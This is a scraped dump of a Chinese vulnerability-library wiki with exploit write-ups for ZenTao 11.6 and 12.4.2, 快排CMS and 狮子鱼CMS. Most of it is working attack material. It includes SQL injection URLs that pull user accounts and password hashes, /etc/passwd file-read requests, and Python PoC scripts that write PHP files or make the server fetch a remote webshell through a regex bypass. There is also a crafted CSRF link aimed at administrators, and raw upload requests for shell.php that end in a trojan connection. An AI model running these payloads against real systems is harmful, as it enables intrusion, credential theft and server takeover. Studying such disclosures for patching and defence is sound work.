class_exists(\"my$moduleName\") ? \"my$moduleName\" : $moduleName; if(!class_exists($className)) $this->triggerError(\"the control $className not found\", __FILE__, __LINE__, $exit = true); /* * 创建control类的实例。 * Create a instance of the control. **/ $module = new $className(); if(!method_exists($module, $methodName)) $this->triggerError(\"the module $moduleName has no $methodName method\", __FILE__, __LINE__, $exit = true); $this->control = $module; /* include default value for module*/ $defaultValueFiles = glob($this->getTmpRoot() . \"defaultvalue/*.php\"); if($defaultValueFiles) foreach($defaultValueFiles as $file) include $file; /* * 使用反射机制获取函数参数的默认值。 * Get the default settings of the method to be called using the reflecting. * * */ $defaultParams = array(); $methodReflect = new reflectionMethod($className, $methodName); foreach($methodReflect->getParameters() as $param) { $name = $param->getName(); $default = '_NOT_SET'; if(isset($paramDefaultValue[$appName][$className][$methodName][$name])) { $default = $paramDefaultValue[$appName][$className][$methodName][$name]; } elseif(isset($paramDefaultValue[$className][$methodName][$name])) { $default = $paramDefaultValue[$className][$methodName][$name]; } elseif($param->isDefaultValueAvailable()) { $default = $param->getDefaultValue(); } $defaultParams[$name] = $default; } /** * 根据PATH_INFO或者GET方式设置请求的参数。 * Set params according PATH_INFO or GET. */ if($this->config->requestType != 'GET') { $this->setParamsByPathInfo($defaultParams); } else { $this->setParamsByGET($defaultParams); } if($this->config->framework->filterParam == 2) { $_GET = validater::filterParam($_GET, 'get'); $_COOKIE = validater::filterParam($_COOKIE, 'cookie'); } /* 调用该方法 Call the method. */ call_user_func_array(array($module, $methodName), $this->params); return $module; } 通过之前获取的moduleName包含对应的control类文件并实例化，随后调用setParamsByPathInfo方法从路径中获取方法对应的参数值，最后通过call_user_func_array方法调用对应control类中的对应方法并赋值。 我们查看module/api/control.php文件中的getModel方法 这里通过call_user_func_array函数调用所有的model文件的所有方法。 $result = call_user_func_array(array(&$module, $methodName), $params); 可以看到module/api/moudel.php中的sql函数 public function sql($sql, $keyField = '') { $sql = trim($sql); if(strpos($sql, ';') !== false) $sql = substr($sql, 0, strpos($sql, ';')); a($sql); if(empty($sql)) return ''; if(stripos($sql, 'select ') !== 0) { return $this->lang->api->error->onlySelect; } else { try { $stmt = $this->dao->query($sql); if(empty($keyField)) return $stmt->fetchAll(); $rows = array(); while($row = $stmt->fetch()) $rows[$row->$keyField] = $row; return $rows; } catch(PDOException $e) { return $e->getMessage(); } } } 这里并没有进行过滤，只使用了代码$sql=trim($sql)过滤了空格 我们看一下这里的调用这个方法需要的权限 这里可以看到任何用户都可以调用这个模块的方法，所以我们用它调用sql方法进行查询(空格转换为+,绕过过滤) http://xxx.xxx.xxx.xxx/api-getModel-api-sql-sql=select+account,password+from+zt_user 成功执行sql语句 漏洞利用POC 登陆后访问 http://xxx.xxx.xxx.xxx/api-getModel-api-sql-sql=select+account,password+from+zt_user 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/禅道CMS/禅道 11.6版本 任意文件读取漏洞.html":{"url":"book/CMS漏洞/禅道CMS/禅道 11.6版本 任意文件读取漏洞.html","title":"禅道 11.6版本 任意文件读取漏洞","keywords":"","body":"禅道 11.6版本 任意文件读取漏洞 漏洞描述 禅道 11.6 版本中对用户接口调用权限过滤不完善，导致调用接口执行SQL语句导致SQL注入 影响版本 [!NOTE] 禅道 11.6 环境搭建 这里使用docker环境搭建 docker run --name zentao_v11.6 -p 8084:80 -v /u01/zentao/www:/app/zentaopms -v /u01/zentao/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d docker.io/yunwisdom/zentao:v11.6 访问 http://xxx.xxx.xxx.xxx:8084 按步骤安装即可 漏洞复现 这里造成漏洞的原因同样是调用接口权限无限制的原因 接口出现漏洞的原因具体参考可以查看上一篇 禅道 11.6版本 SQL注入漏洞 关于此漏洞的完整分析 第一种方法 查看module/file/moudel.php下的parseCSV方法 public function parseCSV($fileName) { $content = file_get_contents($fileName); /* Fix bug #890. */ $content = str_replace(\"\\x82\\x32\", \"\\x10\", $content); $lines = explode(\"\\n\", $content); $col = -1; $row = 0; $data = array(); foreach($lines as $line) { $line = trim($line); $markNum = substr_count($line, '\"') - substr_count($line, '\\\"'); if(substr($line, -1) != ',' and (($markNum % 2 == 1 and $col != -1) or ($markNum % 2 == 0 and substr($line, -2) != ',\"' and $col == -1))) $line .= ','; $line = str_replace(',\"\",', ',,', $line); $line = str_replace(',\"\",', ',,', $line); $line = preg_replace_callback('/(\\\"{2,})(\\,+)/U', array($this, 'removeInterference'), $line); $line = str_replace('\"\"', '\"', $line); /* if only one column then line is the data. */ if(strpos($line, ',') === false and $col == -1) { $data[$row][0] = trim($line, '\"'); } else { /* if col is not -1, then the data of column is not end. */ if($col != -1) { $pos = strpos($line, '\",'); if($pos === false) { $data[$row][$col] .= \"\\n\" . $line; $data[$row][$col] = str_replace('&comma;', ',', $data[$row][$col]); continue; } else { $data[$row][$col] .= \"\\n\" . substr($line, 0, $pos); $data[$row][$col] = trim(str_replace('&comma;', ',', $data[$row][$col])); $line = substr($line, $pos + 2); $col++; } } if($col == -1) $col = 0; /* explode cols with delimiter. */ while($line) { /* the cell has '\"', the delimiter is '\",'. */ if($line{0} == '\"') { $pos = strpos($line, '\",'); if($pos === false) { $data[$row][$col] = substr($line, 1); /* if line is not empty, then the data of cell is not end. */ if(strlen($line) >= 1) continue 2; $line = ''; } else { $data[$row][$col] = substr($line, 1, $pos - 1); $line = substr($line, $pos + 2); } $data[$row][$col] = str_replace('&comma;', ',', $data[$row][$col]); } else { /* the delimiter default is ','. */ $pos = strpos($line, ','); /* if line is not delimiter, then line is the data of cell. */ if($pos === false) { $data[$row][$col] = $line; $line = ''; } else { $data[$row][$col] = substr($line, 0, $pos); $line = substr($line, $pos + 1); } } $data[$row][$col] = trim(str_replace('&comma;', ',', $data[$row][$col])); $col++; } } $row ++; $col = -1; } return $data; } 这里可以看到以file为模块名、parseCSV为方法名去调用读取文件 读取的文件名$filename参数可控，例如读取/etc/passwd http://xxx.xxx.xxx.xxx/api-getModel-file-parseCSV-fileName=/etc/passwd [!NOTE] 注意以 .php .txt 结尾的会被 /framework/base/router.class.php中的parsePathInfo方法 过滤 第二种方法 查看module/api/moudel.php下的getMethod方法 public function getMethod($filePath, $ext = '') { $fileName = dirname($filePath); $className = basename(dirname(dirname($filePath))); if(!class_exists($className)) helper::import($fileName); $methodName = basename($filePath); $method = new ReflectionMethod($className . $ext, $methodName); $data = new stdClass(); $data->startLine = $method->getStartLine(); $data->endLine = $method->getEndLine(); $data->comment = $method->getDocComment(); $data->parameters = $method->getParameters(); $data->className = $className; $data->methodName = $methodName; $data->fileName = $fileName; $data->post = false; $file = file($fileName); for($i = $data->startLine - 1; $i endLine; $i++) { if(strpos($file[$i], '$this->post') or strpos($file[$i], 'fixer::input') or strpos($file[$i], '$_POST')) { $data->post = true; } } return $data; } 这里与第一种大同小异，只是调用了不同模块的方法 看到$fileName = dirname($filePath);这段则为返回的目录名 所以读取/etc/passwd则需要写为/etc/passwd/1来绕过 http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/etc/passwd/1 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/禅道CMS/禅道 11.6版本 任意文件写入漏洞.html":{"url":"book/CMS漏洞/禅道CMS/禅道 11.6版本 任意文件写入漏洞.html","title":"禅道 11.6版本 任意文件写入漏洞","keywords":"","body":"禅道 11.6版本 任意文件读取漏洞 漏洞描述 禅道 11.6 版本中对用户接口调用权限过滤不完善，导致调用接口执行SQL语句导致SQL注入 影响版本 [!NOTE] 禅道 11.6 环境搭建 这里使用docker环境搭建 docker run --name zentao_v11.6 -p 8084:80 -v /u01/zentao/www:/app/zentaopms -v /u01/zentao/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d docker.io/yunwisdom/zentao:v11.6 访问 http://xxx.xxx.xxx.xxx:8084 按步骤安装即可 漏洞复现 这里造成漏洞的原因同样是调用接口权限无限制的原因 接口出现漏洞的原因具体参考可以查看上一篇 禅道 11.6版本 SQL注入漏洞 关于此漏洞的完整分析 查看module/api/ediyor/moudel.php下的save方法 public function save($filePath) { $fileContent = $this->post->fileContent; $evils = array('eval', 'exec', 'passthru', 'proc_open', 'shell_exec', 'system', '$$', 'include', 'require', 'assert'); $gibbedEvils = array('e v a l', 'e x e c', ' p a s s t h r u', ' p r o c _ o p e n', 's h e l l _ e x e c', 's y s t e m', '$ $', 'i n c l u d e', 'r e q u i r e', 'a s s e r t'); $fileContent = str_ireplace($gibbedEvils, $evils, $fileContent); if(get_magic_quotes_gpc()) $fileContent = stripslashes($fileContent); $dirPath = dirname($filePath); $extFilePath = substr($filePath, 0, strpos($filePath, DS . 'ext' . DS) + 4); if(!is_dir($dirPath) and is_writable($extFilePath)) mkdir($dirPath, 0777, true); if(is_writable($dirPath)) { file_put_contents($filePath, $fileContent); } else { die(js::alert($this->lang->editor->notWritable . $extFilePath)); } } $filePath参数和$fileContent参数 我们是可控的 调用方法往 /tmp写入一个phpinfo() http://xxx.xxx.xxx.xxx/api-getModel-editor-save-filePath=/tmp/shell.php POST:fileContent= 在利用 禅道 11.6版本 任意文件读取漏洞 第二种方法来文件包含 http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/tmp/shell/1 也可以写入网站目录中 先获取地址 http://xxx.xxx.xxx.xxx/api-getModel-editor-save-filePath=/tmp/shell POST：fileContent=');?> 访问http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/tmp/shell/1 得到目录为 /app/zentaopma/www 请求改为 http://xxx.xxx.xxx.xxx/api-getModel-editor-save-filePath=/tmp/shell fileContent=');?> 再去访问http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/tmp/shell/1则会再网站目录下生成 xxx.php 文件 漏洞利用POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: zentao version = 11.6 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mZentaosid >>> xxxxxxxxxxxxxx(cookie字段) \\033[0m') print('+------------------------------------------') def POC_1(target_url): version_url = target_url + \"/www/index.php?mode=getconfig\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: response = requests.get(url=version_url, timeout=20, headers=headers) version = json.loads(response.text)['version'] print(\"\\033[32m[o] 禅道版本为:{}\\033[0m\".format(version)) except Exception as e: print(\"\\033[31m[x] 获取版本失败 \\033[0m\", e) sys.exit(0) def POC_2(target_url, zentaosid): headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": \"zentaosid={}\".format(zentaosid) } data = {\"fileContent\":\"\"} write_url = target_url + \"/api-getModel-editor-save-filePath=/tmp/test\" try: response = requests.post(url=write_url, data=data, headers=headers, timeout=10) print(\"\\033[32m[o] 尝试写入php文件... \\033[0m\") except: print(\"\\033[31m[x] 写入php文件失败 \\033[0m\") sys.exit(0) def POC_3(target_url, zentaosid): headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": \"zentaosid={}\".format(zentaosid) } vuln_url = target_url + \"/api-getModel-api-getMethod-filePath=/tmp/test/1\" try: response = requests.get(url=vuln_url, headers=headers, timeout=10) if \"System\" in response.text: print(\"\\033[32m[o] 成功写入文件，存在漏洞, 访问 {}/api-getModel-api-getMethod-filePath=/tmp/test/1/ 查看 \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] 读取php文件失败 \\033[0m\") except: print(\"\\033[31m[x] 读取php文件失败 \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) zentaosid = str(input(\"\\033[35mZentaosid >>> \\033[0m\")) POC_1(target_url) POC_2(target_url, zentaosid) POC_3(target_url, zentaosid) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/禅道CMS/禅道 小于12.4.2 文件上传漏洞 CNVD-C-2020-121325.html":{"url":"book/CMS漏洞/禅道CMS/禅道 小于12.4.2 文件上传漏洞 CNVD-C-2020-121325.html","title":"禅道 小于12.4.2 文件上传漏洞 CNVD-C-2020-121325","keywords":"","body":"禅道 小于12.4.2 文件上传漏洞 CNVD-C-2020-121325 漏洞描述 百度云安全团队监测到禅道官方发布了文件上传漏洞的风险通告，该漏洞编号为CNVD-C-2020-121325，漏洞影响禅道 影响版本 [!NOTE] 禅道 环境搭建 百度下12.4.2的禅道环境按步骤安装下载即可 禅道官方网站 调用接口查询版本信息 http://xxx.xxx.xxx.xxx/www/index.php?mode=getconfig 漏洞复现 [!NOTE] 漏洞触发需要后台权限 根据漏洞描述查看修改后的代码片段 修改前 public function downloadZipPackage($version, $link) { $decodeLink = helper::safe64Decode($link); if(preg_match('/^https?\\:\\/\\//', $decodeLink)) return false; return parent::downloadZipPackage($version, $link); } 修改后 public function downloadZipPackage($version, $link) { $decodeLink = helper::safe64Decode($link); if(!preg_match('/^https?\\:\\/\\//', $decodeLink)) return false; $file = basename($link); $extension = substr($file, strrpos($file, '.') + 1); if(strpos(\",{$this->config->file->allowed},\", \",{$extension},\") === false) return false; return parent::downloadZipPackage($version, $link); } 这里传入的参数为版本和link地址，然后base64解码，正则判断是否为http或https协议，这里的正则过滤并不完整，所以可以绕过用于下载恶意文件 可以大写http或请求FTP来绕过正则 跟进一下parent::downloadZipPackage这个方法，跟着来到zentao\\module\\client\\model.php文件中 public function downloadZipPackage($version, $link) { ignore_user_abort(true); set_time_limit(0); if(empty($version) || empty($link)) return false; $dir = \"data/client/\" . $version . '/'; $link = helper::safe64Decode($link); $file = basename($link); if(!is_dir($this->app->wwwRoot . $dir)) { mkdir($this->app->wwwRoot . $dir, 0755, true); } if(!is_dir($this->app->wwwRoot . $dir)) return false; if(file_exists($this->app->wwwRoot . $dir . $file)) { return commonModel::getSysURL() . $this->config->webRoot . $dir . $file; } ob_clean(); ob_end_flush(); $local = fopen($this->app->wwwRoot . $dir . $file, 'w'); $remote = fopen($link, 'rb'); if($remote === false) return false; while(!feof($remote)) { $buffer = fread($remote, 4096); fwrite($local, $buffer); } fclose($local); fclose($remote); return commonModel::getSysURL() . $this->config->webRoot . $dir . $file; } 可以简单看到这里获取link传入的文件名，通过fopen打开该文件，写入禅道目录www/data/client/version中 查看一下有没有调用这个方法的地方 找到了download方法调用了这个漏洞点，所以我们有两种下载恶意文件的方法 http://xxx.xxx.xxx.xxx/www/client-download-[$version参数]-[base64加密后的恶意文件地址].html http://xxx.xxx.xxx.xxx/www/index.php?m=client&f=download&version=[$version参数]&link=[base64加密后的恶意文件地址] 首先先上传一个恶意文件，可以是FTP也可以是HTTP 例如我上传的文件URL为http://peiqi.tech/SHELL.php http://peiqi.tech/SHELL.php | base64加密 HTTP://peiqi.tech/SHELL.php | SFRUUDovL3BlaXFpLnRlY2gvU0hFTEwucGhw 请求地址则为 http://xxx.xxx.xxx.xxx/www/index.php?m=client&f=download&version=1&link=SFRUUDovL3BlaXFpLnRlY2gvU0hFTEwucGhw 下载的目录地址为zentaopms\\www\\data\\client\\1 [!NOTE] 目录为version名称 成功上传webshell 漏洞利用POC [!NOTE] POC使用需要拥有后台Cookie #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: zentao version >> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mShell >>> http://xxx.xxx.xxx.xxx/shell.php(恶意文件地址) \\033[0m') print('+ \\033[36mZentaosid >>> xxxxxxxxxxxxxx(cookie字段) \\033[0m') print('+------------------------------------------') def POC_1(target_url): version_url = target_url + \"/www/index.php?mode=getconfig\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: response = requests.get(url=version_url, timeout=20, headers=headers) version = json.loads(response.text)['version'] print(\"\\033[32m[o] 禅道版本为:{}\\033[0m\".format(version)) except Exception as e: print(\"\\033[31m[x] 获取版本失败 \\033[0m\", e) def POC_2(target_url, shell_url, zentaosid): options = shell_url.split(\"://\") if options[0] == \"http\": shell_url = \"HTTP://\" + options[1] elif options[0] == \"ftp\": shell_url = \"ftp://\" + options[1] else: print(\"\\033[31m[x] 请使用正确的请求地址 \\033[0m\") sys.exit(0) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\":\"zentaosid={}\".format(zentaosid) } shell_url_base = str((base64.b64encode(shell_url.encode('utf-8'))),'utf-8') vuln_url = target_url + \"/www/index.php?m=client&f=download&version=test&link={}\".format(shell_url_base) print(\"\\033[32m[o] 请求漏洞url：{}\\033[0m\".format(vuln_url)) try: response = requests.get(url=vuln_url, timeout=20, headers=headers) if \"保存成功\" in response.text: print(\"\\033[32m[o] 成功写入Webshell，URL地址为：{}/www/data/client/test/Webshell_name.php\\033[0m\".format(target_url)) else: print(\"\\033[31m[x] 恶意文件下载失败 \\033[0m\") except: print(\"\\033[31m[x] 恶意文件下载失败 \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) shell_url = str(input(\"\\033[35mShell >>> \\033[0m\")) zentaosid = str(input(\"\\033[35mZentaosid >>> \\033[0m\")) POC_1(target_url) POC_2(target_url, shell_url, zentaosid) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/禅道CMS/禅道 小于12.4.2 CSRF漏洞 CNVD-2020-68552.html":{"url":"book/CMS漏洞/禅道CMS/禅道 小于12.4.2 CSRF漏洞 CNVD-2020-68552.html","title":"禅道 小于12.4.2 CSRF漏洞 CNVD-2020-68552","keywords":"","body":"禅道 小于12.4.2 CSRF漏洞 漏洞描述 可以针对禅道的部分模块制造恶意URL地址发送给管理员，当管理员登录时会执行模块的恶意请求,可用于进行钓鱼请求 影响版本 [!NOTE] 禅道 环境搭建 百度下12.4.2的禅道环境按步骤安装下载即可 禅道官方网站 调用接口查询版本信息 http://xxx.xxx.xxx.xxx/www/index.php?mode=getconfig 漏洞复现 这里利用 禅道 小于12.4.2 文件上传漏洞 CNVD-C-2020-121325(可参照上一篇文章) 来构造一个恶意的URL地址 查看module/common/model.php的checkPriv方法 public function checkPriv() { $module = $this->app->getModuleName(); $method = $this->app->getMethodName(); if($this->app->isFlow) { $module = $this->app->rawModule; $method = $this->app->rawMethod; } if(!empty($this->app->user->modifyPassword) and (($module != 'my' or $method != 'changepassword') and ($module != 'user' or $method != 'logout'))) die(js::locate(helper::createLink('my', 'changepassword'))); if($this->isOpenMethod($module, $method)) return true; if(!$this->loadModel('user')->isLogon() and $this->server->php_auth_user) $this->user->identifyByPhpAuth(); if(!$this->loadModel('user')->isLogon() and $this->cookie->za) $this->user->identifyByCookie(); if(isset($this->app->user)) { if(!defined('IN_UPGRADE')) $this->session->user->view = $this->loadModel('user')->grantUserView(); $this->app->user = $this->session->user; if(!commonModel::hasPriv($module, $method)) $this->deny($module, $method); } else { $referer = helper::safe64Encode($this->app->getURI(true)); die(js::locate(helper::createLink('user', 'login', \"referer=$referer\"))); } } 这里的代码片段为鉴权函数，可以看到最后一句代码 $referer = helper::safe64Encode($this->app->getURI(true)); die(js::locate(helper::createLink('user', 'login', \"referer=$referer\"))); 所以当调用当前权限不允许的方法时，会进行跳转，并在$referer参数缓存调用的方法URL，当使用这个跳转的地址登录时则会直接调用此方法 URL地址构造过程 http://xxx.xxx.xxx.xxx/www/index.php?m=user&f=login&referer=/www/index.php.m=client&f=download&version=1&link=HTTP://peiqi.tech/SHELL.php 将link参数base64加密 http://xxx.xxx.xxx.xxx/www/index.php?m=user&f=login&referer=/www/index.php.m=client&f=download&version=1&link=SFRUUDovL3BlaXFpLnRlY2gvU0hFTEwucGhw 将referer参数以 . 做分割base64加密两边字符 http://xxx.xxx.xxx.xxx/www/index.php?m=user&f=login&referer=L3d3dy9pbmRleC5waHA.bT1jbGllbnQmZj1kb3dubG9hZCZ2ZXJzaW9uPTEmbGluaz1TRlJVVURvdkwzQmxhWEZwTG5SbFkyZ3ZVMGhGVEV3dWNHaHc= 将这个URL地址发送给管理员，当管理员登录时则会触发恶意文件下载 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/快排CMS/":{"url":"book/CMS漏洞/快排CMS/","title":"快排CMS","keywords":"","body":"快排CMS 快排CMS 任意文件上传漏洞 快排CMS 信息泄露漏洞 快排CMS 后台XSS漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/快排CMS/快排CMS 信息泄露漏洞.html":{"url":"book/CMS漏洞/快排CMS/快排CMS 信息泄露漏洞.html","title":"快排CMS 信息泄露漏洞","keywords":"","body":"快排CMS 信息泄露漏洞 漏洞描述 快排CMS 默认开启日志记录，由于日志名为时间作为文件名，造成管理员的Cookie泄露 漏洞影响 [!NOTE] 快排 CMS 环境搭建 https://gitee.com/qingzhanwang/kpcms 漏洞复现 文件 thinkphp/library/think/log/driver/Socket.php 这里默认开启日志写入 runtime/log/202104/06.log 其中可以看到泄露了管理员的Cookie信息和其他敏感信息 并且文件命名为 年+月/日期.log 这里关注后台的日志文件中的 admin.php页面的cookie就可以获得管理员权限 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/快排CMS/快排CMS 后台XSS漏洞.html":{"url":"book/CMS漏洞/快排CMS/快排CMS 后台XSS漏洞.html","title":"快排CMS 后台XSS漏洞","keywords":"","body":"快排CMS 后台XSS漏洞 漏洞描述 快排CMS 后台存在XSS漏洞，通过后台构造特殊语句可以造成访问网站的用户被XSS影响 漏洞影响 [!NOTE] 快排 CMS 环境搭建 https://gitee.com/qingzhanwang/kpcms 漏洞复现 漏洞出现在登录后台的网站编辑的位置，由于没有对输出的字符进行过滤，导致XSS 主页版权处嵌入XSS代码 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/快排CMS/快排CMS 任意文件上传漏洞.html":{"url":"book/CMS漏洞/快排CMS/快排CMS 任意文件上传漏洞.html","title":"快排CMS 任意文件上传漏洞","keywords":"","body":"快排CMS 任意文件上传漏洞 漏洞描述 快排CMS 后台管理模块存在任意文件上传漏洞，攻击者通过漏洞可以控制服务器 漏洞影响 [!NOTE] 快排 CMS 环境搭建 https://gitee.com/qingzhanwang/kpcms 漏洞复现 登录页面如下, 默认账号密码为 admin/admin http://xxx.xxx.xxx.xxx/admin.php/index/login.html 源码中没有对上传文件的后缀检测 thinkphp/library/think/File.php 任意找一处文件上传点 上传抓包获取文件地址 POST /admin.php/index/upload.html?dir=image HTTP/1.1 Host: 192.168.1.108:88 Content-Length: 935 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://192.168.1.108:88 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYIt9WaQZiDMrwAVm User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/avif,http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/webp,http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://192.168.1.108:88/admin.php/config/index.html Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: admin_id=IphHb2Z%2FRG9gIXGA7HpPzQ%3D%3D; menu_show=0; menu_id=menu_22; url=%2Fadmin.php%2Fconfig%2Findex.html x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 Connection: close ------WebKitFormBoundaryYIt9WaQZiDMrwAVm Content-Disposition: form-data; name=\"localUrl\" C:\\fakepath\\shell.php ------WebKitFormBoundaryYIt9WaQZiDMrwAVm Content-Disposition: form-data; name=\"imgFile\"; filename=\"shell.php\" Content-Type: application/octet-stream ------WebKitFormBoundaryYIt9WaQZiDMrwAVm-- 连接冰蝎木马即可 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/狮子鱼CMS/":{"url":"book/CMS漏洞/狮子鱼CMS/","title":"狮子鱼CMS","keywords":"","body":"狮子鱼CMS 狮子鱼CMS wxapp.php 任意文件上传漏洞 狮子鱼CMS image_upload.php 任意文件上传 狮子鱼CMS ApigoodController.class.php SQL注入漏洞 狮子鱼CMS ApiController.class.php SQL注入漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/狮子鱼CMS/狮子鱼CMS wxapp.php 任意文件上传漏洞.html":{"url":"book/CMS漏洞/狮子鱼CMS/狮子鱼CMS wxapp.php 任意文件上传漏洞.html","title":"狮子鱼CMS wxapp.php 任意文件上传漏洞","keywords":"","body":"狮子鱼CMS wxapp.php 任意文件上传漏洞 漏洞描述 狮子鱼CMS wxapp.php文件 存在任意文件上传漏洞，攻击者在没有身份验证的情况下可以上传恶意文件 漏洞影响 [!NOTE] 狮子鱼CMS FOFA [!NOTE] \"/seller.php?s=/Public/login\" 漏洞复现 登录页面如下 发送请求包上传PHP文件 POST /wxapp.php?controller=Goods.doPageUpload HTTP/1.1 Host: Content-Length: 210 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: null Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/avif,http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/webp,http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close ------WebKitFormBoundary8UaANmWAgM4BqBSs Content-Disposition: form-data; name=\"upfile\"; filename=\"test.php\" Content-Type: http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif ------WebKitFormBoundary8UaANmWAgM4BqBSs-- 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/狮子鱼CMS/狮子鱼CMS image_upload.php 任意文件上传.html":{"url":"book/CMS漏洞/狮子鱼CMS/狮子鱼CMS image_upload.php 任意文件上传.html","title":"狮子鱼CMS image_upload.php 任意文件上传","keywords":"","body":"狮子鱼CMS image_upload.php 任意文件上传 漏洞描述 狮子鱼CMS使用CK编辑器，存在图片上传的绕过，造成 image_upload.php 任意文件上传 漏洞影响 [!NOTE] 狮子鱼CMS FOFA [!NOTE] \"/seller.php?s=/Public/login\" 漏洞复现 登录页面如下 漏洞文件为 CK编辑器的 image_upload.php $max_size) { // 判断文件大小是否大于500000字节 echo '{\"result\":\"400\",\"msg\":\"上传图片太大，最大支持：'.($max_size/1024).'KB\"}'; exit (); } if (! in_array ( $file ['type'], $arrType )) { // 判断图片文件的格式 echo '{\"result\":\"400\",\"msg\":\"上传图片格式不对\"}'; exit (); } if (! file_exists ( $upfile )) { // 判断存放文件目录是否存在 mkdir ( $upfile, 0777, true ); } $imageSize = getimagesize ( $file ['tmp_name'] ); $img = $imageSize [0] . '*' . $imageSize [1]; $fname = $file ['name']; $ftype = explode ( '.', $fname ); $time = explode ( \" \", microtime () ); $time = $time [1] . ($time [0] * 1000); $time2 = explode ( \".\", $time ); $time = $time2 [0]; $returnName=$time.\".\" .end($ftype); $picName = $upfile . \"/\" . $returnName ; if (! move_uploaded_file ( $file ['tmp_name'], $picName )) { echo '{\"result\":\"400\",\"msg\":\"从:'.$file ['tmp_name'].'移动图片到:'.$picName.'出错\"}'; exit (); } else { echo '{\"result\":\"200\",\"imgurl\":\"http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/uploads/' . $returnName . '\"}'; } } ?> 其中使用 